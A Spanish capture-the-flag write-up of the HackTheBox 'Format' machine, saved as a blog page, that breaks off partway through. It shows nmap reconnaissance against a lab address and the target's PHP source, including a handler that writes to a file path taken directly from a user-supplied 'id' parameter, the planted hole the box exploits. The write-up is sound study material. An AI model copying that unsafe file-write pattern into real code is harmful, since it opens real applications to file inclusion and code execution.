@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Format - LFI, Redis y Python format string | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="HackTheBox Format - LFI, Redis y Python format string">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE">
+<meta property="og:description" content="Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE">
+<link rel="canonical" href="https://ic4rta.github.io//hackthebox/2023/06/12/htb-format.html">
+<meta property="og:url" content="https://ic4rta.github.io//hackthebox/2023/06/12/htb-format.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-06-12T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="HackTheBox Format - LFI, Redis y Python format string">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-06-12T00:00:00+00:00","datePublished":"2023-06-12T00:00:00+00:00","description":"Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE","headline":"HackTheBox Format - LFI, Redis y Python format string","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//hackthebox/2023/06/12/htb-format.html"},"url":"https://ic4rta.github.io//hackthebox/2023/06/12/htb-format.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Format - LFI, Redis y Python format string</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-06-12T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Jun 12, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 4323 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 27 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#LFI">#LFI</a><a class="post-tag" href="/tags.html#Python%20Format%20String">#Python Format String</a>
+</div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p>Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE</p>
+
+<p>Para la flag de user nos volveremos a conectar por el socket a redis, para filtrar la contraseña de SSH, y para la escalada explotaremos una vulnerabilidad format string en python</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn --open -p- 10.10.11.213
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+</code></pre></div></div>
+
+<p>Ese puerto 3000 se ve curioso, asi que escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -p22,80,3000 10.10.11.213 
+</code></pre></div></div>
+
+<p>Vean como en el escaneo nos dice que el puerto 3000 nos redirecciona hacia <code class="language-plaintext highlighter-rouge">microblog.htb:3000/</code></p>
+
+<p><img src="/assets/img/htb-format/1.png" alt=""></p>
+
+<p>Asi que lo agregamos al etc/hosts</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     microblog.htb" | tee -a /etc/hosts</code></p>
+
+<p>Y si accedemos por el puerto 80 nos redirecciona a <code class="language-plaintext highlighter-rouge">app.microblog.htb</code>, asi que tambien lo agregamos al etc/hosts</p>
+
+<p><img src="/assets/img/htb-format/2.png" alt=""></p>
+
+<p><code class="language-plaintext highlighter-rouge">echo "10.10.11.213     app.microblog.htb" | tee -a /etc/hosts</code></p>
+
+<p>(les puedo decir que no hace falta hacer fuzzing de directorios y tampoco enumerar subdominios).</p>
+
+<p>Ahora visitaremos la pagina web por el puerto 80, y al mostrar su codigo fuente vemos una URL que nos lleva a otro recurso</p>
+
+<p><img src="/assets/img/htb-format/3.png" alt=""></p>
+
+<p>Al entrar, vemos que corresponde a Gitea, y tambien tenemos el repositorio del proyecto</p>
+
+<p><img src="/assets/img/htb-format/4.png" alt=""></p>
+
+<p>Al ver un poco el codigo fuente, vemos que nos podemos registrar y nos mandara a la ruta <code class="language-plaintext highlighter-rouge">/dashboard</code>, antes que nada, observa este codigo:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$redis</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Redis</span><span class="p">();</span>
+    <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(</span><span class="s1">'/var/run/redis/redis.sock'</span><span class="p">);</span>
+    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HGET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">strval</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /register?message=User already exists&amp;status=fail"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
+        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /dashboard?message=Registration successful!&amp;status=success"</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Primero que nada crear una instancia de la clase <code class="language-plaintext highlighter-rouge">Redis()</code> llamada <code class="language-plaintext highlighter-rouge">redis</code>, y establece una conexion usando el archivo <code class="language-plaintext highlighter-rouge">/var/run/redis/redis.sock</code>, y en caso de que el usuario se haya registrado, se redireccionara a <code class="language-plaintext highlighter-rouge">/dashboard</code> con un mensaje de que se registro correctamente, como se puede ver:</p>
+
+<p><img src="/assets/img/htb-format/5.png" alt=""></p>
+
+<p>Una vez en el dashboard, nos dejara crear un nuevo blog, que por la estructura, seria un subdominio de <code class="language-plaintext highlighter-rouge">microblog.htb</code> (tambien hay que agregarlo el /etc/hosts)</p>
+
+<p><img src="/assets/img/htb-format/6.png" alt=""></p>
+
+<p>Tambien podemos ver que podemos editar nuestro blog, donde recibe dos datos, un header (h1) y un texto, en este punto interceptare la peticion con burp.</p>
+
+<p><img src="/assets/img/htb-format/7.png" alt=""></p>
+
+<p>Vemos como nuestros datos se pasan por una peticion por POST, si volvemos a ver el codigo fuente, encontraremos las funciones que agregan el texto en ambos parametros</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"/../content"</span><span class="p">);</span>
+    <span class="nv">$txt_nl</span> <span class="o">=</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'txt'</span><span class="p">]);</span>
+    <span class="nv">$html</span> <span class="o">=</span> <span class="s2">"&lt;div class = </span><span class="se">\"</span><span class="s2">blog-text</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$txt_nl</span><span class="si">}</span><span class="s2">&lt;/div&gt;"</span><span class="p">;</span>
+    <span class="nv">$post_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">,</span> <span class="nv">$html</span><span class="p">);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$post_file</span><span class="p">);</span>
+    <span class="nv">$order_file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"order.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
